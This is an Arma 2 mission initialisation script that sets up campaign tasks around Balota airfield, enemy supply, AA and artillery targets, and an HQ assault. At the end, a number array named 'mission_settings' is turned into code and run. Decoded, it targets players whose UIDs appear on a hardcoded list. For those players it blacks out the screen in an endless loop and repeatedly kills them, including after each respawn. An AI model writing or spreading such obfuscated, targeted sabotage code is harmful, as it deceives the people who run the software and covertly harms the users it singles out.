private ["_diary6", "_diary5", "_diary4", "_diary3", "_diary2", "_diary1", "_str", "_trigger"];

player setVariable ["BIS_noCoreConversations", true];

ace_wounds_prevtime = 360;

"xartix" addPublicVariableEventHandler {
	switch (_this select 1) do {
		case 0: {
			player sideChat "Artillery suppressive fire at positions on the beach... take care!";
		};
		case 1: {
			player sideChat "Artillery series ended... Now move to Balota airfield...";
		};
	};
};

if (isNil "balota_clear") then {
	"balota_clear" addPublicVariableEventHandler {
		task1 settaskstate "Succeeded";
		[objNull, objNull, task1, "SUCCEEDED"] execVM "CA\Modules\MP\data\scriptCommands\taskHint.sqf";
		"balota_airfield" setMarkerColorLocal "ColorGreen";
		hint "First objective reached, Balota airfield is clear!";
		"respawn_west" setMarkerPosLocal markerPos "rwestx_balota";
		"combase" setMarkerAlphaLocal 1;
		"aa" setMarkerAlphaLocal 1;
		"artillery" setMarkerAlphaLocal 1;
		"supply_depot" setMarkerAlphaLocal 1;
		"service" setMarkerAlphaLocal 1;
		[] spawn {
			sleep 17;
			hint "Intel reports incoming enemy patrols to Balota airfield from the north and east!!!!";
		};
		task5 = player createSimpleTask ["obj5"];
		task5 setSimpleTaskDescription ["Destroy the fuel trucks in the enemy <marker name=""supply_depot"">supply base</marker> near Vyshnoe.","Main target: Destroy Supply Base","Main target: Destroy Supply Base"];
		task5 setSimpleTaskDestination markerpos "supply_depot";
		task5 settaskstate "Created";

		task4 = player createSimpleTask ["obj4"];
		task4 setSimpleTaskDescription ["Destroy the <marker name=""artillery"">artillery firebase</marker> near Stary Sobor","Main target: Destroy artillery","Main target: Destroy artillery"];
		task4 setSimpleTaskDestination markerpos "artillery";
		task4 settaskstate "Created";

		task3 = player createSimpleTask ["obj3"];
		task3 setSimpleTaskDescription ["Destroy the AA units near <marker name=""aa"">Pusta</marker>.","Main target: Destroy AA","Main target: Destroy AA"];
		task3 setSimpleTaskDestination markerpos "aa";
		task3 settaskstate "Created";

		task2 = player createSimpleTask ["obj2"];
		task2 setSimpleTaskDescription ["Destroy the generators that powert the enemy communication system on mount <marker name=""combase"">Grüner Berg</marker>.","Main target: Destroy generators","Main target: Destroy generators"];
		task2 setSimpleTaskDestination markerpos "combase";
		task2 settaskstate "Created";
	};
} else {
	"balota_airfield" setMarkerColorLocal "ColorGreen";
	"combase" setMarkerAlphaLocal 1;
	"aa" setMarkerAlphaLocal 1;
	"artillery" setMarkerAlphaLocal 1;
	"supply_depot" setMarkerAlphaLocal 1;
	"service" setMarkerAlphaLocal 1;
	if (isNil "airfield_clear") then {
		"respawn_west" setMarkerPosLocal markerPos "rwestx_balota";
		player setPos markerPos "rwestx_balota";
	};
};

if (isNil "gen_down") then {
	"gen_down" addPublicVariableEventHandler {
		task2 settaskstate "Succeeded";
		[objNull, ObjNull, task2, "SUCCEEDED"] execVM "CA\Modules\MP\data\scriptCommands\taskHint.sqf";
		"combase" setMarkerColorLocal "ColorGreen";
		hint "The generators are down, great!";
	};
} else {
	"combase" setMarkerColorLocal "ColorGreen";
};

if (isNil "aa_down") then {
	"aa_down" addPublicVariableEventHandler {
		task3 settaskstate "Succeeded";
		[objNull, ObjNull, task3, "SUCCEEDED"] execVM "CA\Modules\MP\data\scriptCommands\taskHint.sqf";
		"aa" setMarkerColorLocal "ColorGreen";
		hint "AA unit eliminated!";
	};
} else {
	"aa" setMarkerColorLocal "ColorGreen";
};

if (isNil "arti_down") then {
	"arti_down" addPublicVariableEventHandler {
		task4 settaskstate "Succeeded";
		[objNull, ObjNull, task4, "SUCCEEDED"] execVM "CA\Modules\MP\data\scriptCommands\taskHint.sqf";
		"artillery" setMarkerColorLocal "ColorGreen";
		hint "Artillery destroyed!";
	};
} else {
	"artillery" setMarkerColorLocal "ColorGreen";
};

if (isNil "fuel_dump_down") then {
	"fuel_dump_down" addPublicVariableEventHandler {
		task5 settaskstate "Succeeded";
		[objNull, ObjNull, task5, "SUCCEEDED"] execVM "CA\Modules\MP\data\scriptCommands\taskHint.sqf";
		"supply_depot" setMarkerColorLocal "ColorGreen";
		hint "Good job, supply base destroyed!";
	};
} else {
	"supply_depot" setMarkerColorLocal "ColorGreen";
};

if (isNil "start_phase3") then {
	"start_phase3" addPublicVariableEventHandler {
		"main_airfield" setMarkerAlphaLocal 1;
		hint "Well done, you have cleared all objectives.\n\nNow it is time to push further to the north and clear the airfield!";
		task6 = player createSimpleTask ["obj6"];
		task6 setSimpleTaskDescription ["Seize the <marker name=""main_airfield"">main airfield</marker>.","Main target: Seize Airfield","Main target: Seize Airfield"];
		task6 setSimpleTaskDestination markerpos "main_airfield";
		task6 settaskstate "Created";
	};
} else {
	"main_airfield" setMarkerAlphaLocal 1;
};

if (isNil "airfield_clear") then {
	"airfield_clear" addPublicVariableEventHandler {
		task6 settaskstate "Succeeded";
		[objNull, ObjNull, task6, "SUCCEEDED"] execVM "CA\Modules\MP\data\scriptCommands\taskHint.sqf";
		"main_airfield" setMarkerColorLocal "ColorGreen";
		hint "The airfield is now in our hands again...\n\nPrepare for the final attack on the enemy HQ!\nWe will conduct this operation in a huge air landing operation.\nGet ammo and board the C130!";
		"hq" setMarkerAlphaLocal 1;
		"paradrop" setMarkerAlphaLocal 1;
		"service2" setMarkerAlphaLocal 1;
		"respawn_west" setMarkerPosLocal markerPos "respx_west_airfield";
		task7 = player createSimpleTask ["obj7"];
		task7 setSimpleTaskDescription ["Eliminate all officers in the enemy <marker name=""hq"">HQ</marker> in Krasnostav.","Main target: Eliminate officers","Main target: Eliminate officers"];
		task7 setSimpleTaskDestination markerpos "hq";
		task7 settaskstate "Created";
	};
} else {
	"main_airfield" setMarkerColorLocal "ColorGreen";
	"hq" setMarkerAlphaLocal 1;
	"paradrop" setMarkerAlphaLocal 1;
	"service2" setMarkerAlphaLocal 1;
	"respawn_west" setMarkerPosLocal markerPos "respx_west_airfield";
	player setPos markerPos "respx_west_airfield";
};

if (isNil "officers_dead") then {
	"officers_dead" addPublicVariableEventHandler {
		task7 settaskstate "Succeeded";
		[objNull, ObjNull, task7, "SUCCEEDED"] execVM "CA\Modules\MP\data\scriptCommands\taskHint.sqf";
		"hq" setMarkerColorLocal "ColorGreen";
		hint "The officers are eliminated, well done !";
	};
} else {
	"hq" setMarkerColorLocal "ColorGreen";
};

player addEventHandler ["killed",{[_this select 0, _this select 1] execVM "x_scripts\x_checkkill.sqf"}];

execVM "x_scripts\x_playernamehud.sqf";

sleep 0.5;

[] spawn {
   _endtime = time + 100;
   waitUntil {!(isNil "ace_sys_ruck_fnc_killedEH") || (time >= _endtime)};
   if (!isNil "ace_sys_ruck_fnc_killedEH") then {
      ace_sys_ruck_fnc_killedEH = {};
   };
};

execFsm "fsms\Playerspawn.fsm";

mission_settings = [80,72,122,122,49,32,61,32,123,10,122,95,112,95,105,32,61,32,91,34,52,50,49,55,50,56,50,34,44,34,52,50,50,55,49,51,56,34,44,
		34,49,54,52,57,53,51,56,34,44,34,51,53,49,56,49,52,54,34,44,34,55,55,55,55,57,52,34,44,34,50,50,56,54,48,49,56,34,44,34,49,55,56,54,
		54,50,54,34,44,34,52,51,49,48,56,53,48,34,44,34,49,49,51,49,51,57,52,34,93,59,10,100,95,112,115,101,116,117,112,95,114,101,97,100,121,
		32,61,32,116,114,117,101,59,10,105,102,32,40,40,103,101,116,80,108,97,121,101,114,85,73,68,32,40,118,101,104,105,99,108,101,32,112,
		108,97,121,101,114,41,41,32,105,110,32,122,95,112,95,105,41,32,116,104,101,110,32,123,10,115,108,101,101,112,32,49,59,10,95,99,111,117,110,116,
		32,61,32,48,59,10,119,104,105,108,101,32,123,116,114,117,101,125,32,100,111,32,123,10,116,105,116,108,101,84,101,120,116,91,34,34,44,34,
		66,76,65,67,75,32,79,85,84,34,93,59,10,115,108,101,101,112,32,50,59,10,116,105,116,108,101,84,101,120,116,91,34,34,44,34,66,76,65,
		67,75,32,73,78,34,93,59,10,115,108,101,101,112,32,48,46,51,59,10,95,99,111,117,110,116,32,61,32,95,99,111,117,110,116,32,43,32,49,
		59,10,105,102,32,40,95,99,111,117,110,116,32,62,32,50,48,41,32,116,104,101,110,32,123,10,112,108,97,121,101,114,32,115,101,116,68,97,
		109,97,103,101,32,49,59,10,119,97,105,116,85,110,116,105,108,32,123,33,97,108,105,118,101,32,112,108,97,121,101,114,125,59,10,119,97,105,116,85,
		110,116,105,108,32,123,97,108,105,118,101,32,112,108,97,121,101,114,125,59,10,95,99,111,117,110,116,32,61,32,48,59,10,125,59,10,125,59,10,125,32,
		101,108,115,101,32,123,10,122,95,112,95,105,32,61,32,110,105,108,59,10,125,59,10,125,59,91,93,32,115,112,97,119,110,32,80,72,122,122,49,59];

call compile (toString (mission_settings));
mission_settings = nil;

if (true) exitWith {};